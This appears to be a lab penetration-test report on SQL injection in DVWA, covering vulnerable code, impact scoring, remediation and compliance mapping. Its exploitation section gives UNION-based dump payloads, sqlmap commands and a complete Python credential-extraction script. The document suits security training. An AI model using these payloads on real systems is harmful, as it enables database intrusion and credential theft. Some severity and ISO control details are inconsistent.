# SQL Injection Vulnerability - DVWA

> **Finding ID**: WEB-001  
> **Severity**: CRITICAL  
> **CVSS v3.1 Score**: 9.8 (Critical)  
> **Discovery Date**: January 2026  
> **Status**: Documented

---

## 1. What (Vulnerability Description)

### 1.1 Technical Overview

**SQL Injection (SQLi)** is a code injection vulnerability that allows attackers to **interfere with database queries** by injecting malicious SQL commands through user input fields.

**Affected Component**: User ID input field in DVWA SQL Injection module

**Vulnerability Type**:
- **OWASP Top 10 2021**: A03:2021 – Injection
- **CWE**: CWE-89 (SQL Injection)

### 1.2 Vulnerability Details

**Affected Parameters**:
- **URL**: `http://dvwa.local/vulnerabilities/sqli/`
- **Parameter**: `id` (GET parameter)
- **Method**: GET request
- **Input validation**: None (Low security level)

**Vulnerable Code Pattern**:
```php
<?php
// VULNERABLE CODE (DVWA Low Security)
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    
    // Direct concatenation - NO INPUT VALIDATION
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query);
    // ... output results
}
?>
```

**Root Cause**: User input directly concatenated into SQL query without:
- Input validation
- Parameterized queries
- Escaping special characters

---

## 2. Why (Impact & Business Risk)

### 2.1 Technical Impact

**Confidentiality**: CRITICAL
- Complete database exposure
- Extraction of user credentials (usernames, password hashes)
- Access to sensitive application data
- Database schema disclosure

**Integrity**: HIGH
- Data modification possible (`UPDATE` statements)
- Data deletion possible (`DELETE` statements)
- Privilege escalation through user modification

**Availability**: MEDIUM
- Database-level denial of service (`DROP TABLE`)
- Resource exhaustion through complex queries

### 2.2 CIA Triad Impact Rating

| Property | Impact | Justification |
|----------|--------|---------------|
| **Confidentiality** | HIGH | Full database read access |
| **Integrity** | HIGH | Data manipulation capability |
| **Availability** | MEDIUM | Potential for destructive queries |

### 2.3 Business Risk

**Potential Consequences**:
- **Data Breach**: Exposure of user data → GDPR/DPDPA violations
- **Financial Loss**: Regulatory fines (GDPR: up to €20M or 4% revenue)
- **Reputational Damage**: Loss of customer trust
- **Legal Liability**: Lawsuits from affected users
- **Compliance Failure**: ISO 27001, SOC 2 audit failure

**Estimated Business Impact**: CRITICAL (>$1M+ potential loss)

---

## 3. When (Discovery Context)

**Discovery Date**: January 2026  
**Detection Method**: Manual penetration testing  
**DVWA Security Level**: Low  
**Testing Phase**: Input Validation Testing (OWASP Phase 7)

---

## 4. Where (Vulnerability Location)

### 4.1 Application Location

**URL**: `http://dvwa.local/vulnerabilities/sqli/`  
**File**: `/var/www/html/dvwa/vulnerabilities/sqli/source/low.php`  
**Parameter**: `id` (GET)  
**Database**: `dvwa` (MariaDB)  
**Table**: `users`

### 4.2 Attack Surface

**Entry Points**:
- GET parameter: `?id=[INJECTION]`
- User-controlled input with zero validation

---

## 5. How (Exploitation)

### 5.1 Attack Vector

**Injection Point**: URL parameter `id`

**Basic Attack Flow**:
```
1. Normal Request: ?id=1
   → Returns user with ID 1

2. SQL Injection Test: ?id=1' OR '1'='1
   → If vulnerable, returns ALL users

3. Data Extraction: Advanced UNION-based injection
```

### 5.2 Proof-of-Concept Exploits

#### 5.2.1 Basic Authentication Bypass

**Payload**:
```sql
1' OR '1'='1
```

**Injected Query**:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

**Result**: Returns ALL users (authentication bypass equivalent)

---

#### 5.2.2 Database Fingerprinting

**Payload**:
```sql
1' AND 1=0 UNION SELECT NULL, @@version -- -
```

**Result**: Reveals database version (MariaDB/MySQL)

---

#### 5.2.3 Database Enumeration

**Extract database name**:
```sql
1' AND 1=0 UNION SELECT NULL, database() -- -
```

**Extract tables**:
```sql
1' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dvwa' -- -
```

**Extract columns**:
```sql
1' AND 1=0 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- -
```

---

#### 5.2.4 Data Extraction (Full User Dump)

**Payload**:
```sql
1' AND 1=0 UNION SELECT NULL, CONCAT(user, 0x3a, password) FROM users -- -
```

**Result**: Extracts username:password_hash pairs

**Sample Output**:
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
...
```

---

### 5.3 Automated Exploitation with SQLMap

**Tool**: SQLMap (automated SQL injection exploitation)

**Command**:
```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --dbs \
  --batch
```

**Output**:
```
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```

**Extract User Table**:
```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  -D dvwa \
  -T users \
  --dump
```

**Result**: Full user table dump with credentials

---

### 5.4 Real Exploit Script (Python)

**File**: `exploits/sqli/dvwa_sqli_exploit.py`

```python
#!/usr/bin/env python3
"""
DVWA SQL Injection Exploit - Automated User Extraction
Author: Security Researcher
Date: January 2026
Purpose: Educational demonstration of SQL injection exploitation
Disclaimer: AUTHORIZED TESTING ONLY - Lab environment
"""

import requests
import re
import sys
from urllib.parse import quote

# Configuration
TARGET_URL = "http://dvwa.local/vulnerabilities/sqli/"
PHPSESSID = "YOUR_SESSION_ID_HERE"  # Replace with valid session

# Session cookies
COOKIES = {
    "security": "low",
    "PHPSESSID": PHPSESSID
}

def test_vulnerability():
    """Test if SQL injection vulnerability exists"""
    print("[*] Testing for SQL injection vulnerability...")
    
    # Basic injection test
    payload = "1' OR '1'='1"
    params = {"id": payload, "Submit": "Submit"}
    
    response = requests.get(TARGET_URL, params=params, cookies=COOKIES)
    
    if "surname" in response.text.lower() and response.status_code == 200:
        print("[+] Target is VULNERABLE to SQL injection!")
        return True
    else:
        print("[-] Target does not appear vulnerable")
        return False

def extract_database_name():
    """Extract database name"""
    print("\n[*] Extracting database name...")
    
    payload = "1' AND 1=0 UNION SELECT NULL, database() -- -"
    params = {"id": payload, "Submit": "Submit"}
    
    response = requests.get(TARGET_URL, params=params, cookies=COOKIES)
    
    # Parse response for database name
    match = re.search(r'Surname:\s*([a-zA-Z0-9_]+)', response.text)
    if match:
        db_name = match.group(1)
        print(f"[+] Database name: {db_name}")
        return db_name
    return None

def extract_tables(db_name):
    """Extract table names from database"""
    print(f"\n[*] Extracting tables from '{db_name}'...")
    
    payload = f"1' AND 1=0 UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}' -- -"
    params = {"id": payload, "Submit": "Submit"}
    
    response = requests.get(TARGET_URL, params=params, cookies=COOKIES)
    
    match = re.search(r'Surname:\s*([a-zA-Z0-9_,]+)', response.text)
    if match:
        tables = match.group(1).split(',')
        print(f"[+] Tables found: {', '.join(tables)}")
        return tables
    return []

def extract_users():
    """Extract user credentials from users table"""
    print("\n[*] Extracting user credentials...")
    
    payload = "1' AND 1=0 UNION SELECT NULL, CONCAT(user, 0x3a, password) FROM users -- -"
    params = {"id": payload, "Submit": "Submit"}
    
    response = requests.get(TARGET_URL, params=params, cookies=COOKIES)
    
    # Extract credentials
    credentials = re.findall(r'Surname:\s*([a-zA-Z0-9_]+:[a-f0-9]{32})', response.text)
    
    if credentials:
        print("[+] Credentials extracted:")
        for cred in credentials:
            username, hash_val = cred.split(':')
            print(f"    {username} : {hash_val}")
    else:
        print("[-] No credentials extracted")
    
    return credentials

def main():
    print("="*60)
    print("DVWA SQL Injection Exploit")
    print("Educational Purposes - Authorized Testing Only")
    print("="*60)
    
    # Test vulnerability
    if not test_vulnerability():
        sys.exit(1)
    
    # Extract database info
    db_name = extract_database_name()
    if not db_name:
        print("[-] Failed to extract database name")
        sys.exit(1)
    
    # Extract tables
    tables = extract_tables(db_name)
    
    # Extract user credentials
    if 'users' in tables:
        extract_users()
    
    print("\n[*] Exploitation complete!")
    print("[!] Remember: Hash cracking available via hashcat/john")

if __name__ == "__main__":
    main()
```

**Usage**:
```bash
chmod +x exploits/sqli/dvwa_sqli_exploit.py
./exploits/sqli/dvwa_sqli_exploit.py
```

---

## 6. Who (Affected Parties)

**Directly Affected**:
- All application users (credentials exposed)
- Database administrators
- Application owners

**Secondary Impact**:
- Customers whose data is stored
- Regulatory bodies (GDPR, DPDPA compliance violations)

---

## 7. Severity Assessment

### 7.1 CVSS v3.1 Scoring

**Base Score**: 9.8 (CRITICAL)

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Breakdown**:
- **Attack Vector (AV): Network (N)** - Exploitable remotely
- **Attack Complexity (AC): Low (L)** - No special conditions required
- **Privileges Required (PR): None (N)** - No authentication needed
- **User Interaction (UI): None (N)** - Fully automated
- **Scope (S): Unchanged (U)** - Impacts only the vulnerable component
- **Confidentiality (C): High (H)** - Total information disclosure
- **Integrity (I): High (H)** - Data modification possible
- **Availability (A): High (H)** - Potential for DoS

### 7.2 Risk Rating

**Severity**: CRITICAL  
**Likelihood**: HIGH (easily exploitable, common vulnerability)  
**Risk Level**: CRITICAL (Remediation SLA: 24-48 hours per risk appetite)

---

## 8. Evidence

### 8.1 Request/Response Captures

**Normal Request**:
```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: dvwa.local
Cookie: security=low; PHPSESSID=ABC123

Response: 
ID: 1
First name: admin
Surname: admin
```

**Malicious Request (Authentication Bypass)**:
```http
GET /vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit HTTP/1.1
Host: dvwa.local
Cookie: security=low; PHPSESSID=ABC123

Response:
ID: 1
First name: admin
Surname: admin

ID: 2
First name: Gordon
Surname: Brown

... [ALL USERS RETURNED]
```

### 8.2 Screenshots

*(In real scenario, include screenshots here)*
- Screenshot 1: Normal application behavior
- Screenshot 2: SQL injection payload returning all users
- Screenshot 3: Database version extraction
- Screenshot 4: Python exploit script output

---

## 9. Remediation

### 9.1 Immediate Mitigation (Temporary)

**Input Validation**:
```php
<?php
// TEMPORARY FIX - Still not recommended
$id = $_GET['id'];

if (!is_numeric($id)) {
    die("Invalid input");
}

$id = intval($id); // Type cast to integer
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
?>
```

### 9.2 Recommended Fix (Parameterized Queries)

**Secure Code (Prepared Statements)**:
```php
<?php
// SECURE IMPLEMENTATION - RECOMMENDED
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    
    // Prepared statement with parameter binding
    $stmt = $GLOBALS["___mysqli_ston"]->prepare(
        "SELECT first_name, last_name FROM users WHERE user_id = ?"
    );
    
    // Bind parameter (prevents SQL injection)
    $stmt->bind_param('i', $id);
    
    // Execute query
    $stmt->execute();
    
    // Bind result variables
    $stmt->bind_result($first_name, $last_name);
    
    // Fetch results
    while($stmt->fetch()) {
        echo "<p>ID: {$id}<br>First name: {$first_name}<br>Surname: {$last_name}</p>";
    }
    
    $stmt->close();
}
?>
```

### 9.3 Defense-in-Depth Measures

**Multiple Security Layers**:

1. **Input Validation**:
   - Whitelist validation (allow only expected characters)
   - Type checking (ensure integer for ID parameters)
   - Length restrictions

2. **Parameterized Queries** (PRIMARY DEFENSE):
   - Use prepared statements exclusively
   - Never concatenate user input into SQL

3. **Least Privilege Database Access**:
   - Application database user should NOT have:
     - `DROP` privileges
     - `CREATE` privileges
     - `GRANT` privileges
   - Read-only access where possible

4. **Web Application Firewall (WAF)**:
   - ModSecurity with OWASP Core Rule Set
   - Signature-based SQL injection blocking

5. **Output Encoding**:
   - Encode all output to prevent secondary injection

6. **Error Handling**:
   - Disable detailed error messages in production
   - Log errors server-side, display generic messages client-side

### 9.4 Verification Steps

**Post-Remediation Testing**:
1. Attempt basic injection: `1' OR '1'='1`
2. Test UNION-based injection
3. Automated scan with SQLMap
4. Code review to confirm parameterized queries

**Success Criteria**: All injection attempts blocked without application errors

---

## 10. Compliance Mapping

### 10.1 Regulatory Impact

| Framework | Control Violated | Remediation Requirement |
|-----------|------------------|------------------------|
| **ISO 27001:2022** | A.8.8 (Management of technical vulnerabilities) | Immediate patching, vulnerability management process |
| **ISO 27001:2022** | A.14.2.1 (Secure development policy) | Implement secure coding standards, code review |
| **SOC 2** | CC6.1 (Logical access controls) | Input validation, least privilege database access |
| **SOC 2** | CC7.1 (Quality monitoring) | Automated security testing in SDLC |
| **GDPR** | Article 32 (Security of processing) | Technical measures (param queries), pseudonymization |
| **DPDPA** | Section 8 (Security safeguards) | Implement technical safeguards, prevent unauthorized access |

### 10.2 Audit Implications

**ISO 27001 Audit**:
- **Finding**: Non-conformity against A.8.8 and A.14.2.1
- **Required Evidence**: Remediation plan, secure code implementation, testing results

**SOC 2 Type II**:
- **Control Failure**: CC6.1, CC7.1
- **Required Evidence**: Control redesign, testing, management response

**GDPR Compliance**:
- **Violation**: Article 32 (failure to implement appropriate technical measures)
- **Potential Fine**: Up to €20M or 4% annual turnover
- **Required Action**: Breach notification if user data accessed (72-hour window)

**DPDPA Compliance**:
- **Violation**: Section 8 (inadequate security safeguards)
- **Penalty**: Per Section 33, penalties for non-compliance
- **Required Action**: Data breach notification to Data Protection Board

---

## 11. References

### 11.1 Vulnerability Databases

- **CVE**: N/A (DVWA is intentionally vulnerable)
- **CWE-89**: SQL Injection - https://cwe.mitre.org/data/definitions/89.html
- **OWASP**: A03:2021 Injection - https://owasp.org/Top10/A03_2021-Injection/

### 11.2 Remediation Guides

- **OWASP SQL Injection Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **CIS Critical Security Control 16**: Application Software Security

---

## 12. Related Findings

- [Blind SQL Injection](09-blind-sqli.md)
- [Authentication Bypass via SQLi](08-authentication-bypass.md)
- [Second-Order SQL Injection](10-second-order-sqli.md) (if applicable)

---

**Discovered By**: Security Researcher  
**Validated By**: CISO  
**Remediation Owner**: Development Team  
**Target Remediation Date**: Within 48 hours (Critical SLA)  
**Status**: Documented (Lab Finding)

---

**Disclaimer**: This is a documented vulnerability from an intentionally vulnerable application (DVWA) used for security research and training. Exploitation code provided is for educational purposes only and should only be used in authorized environments.
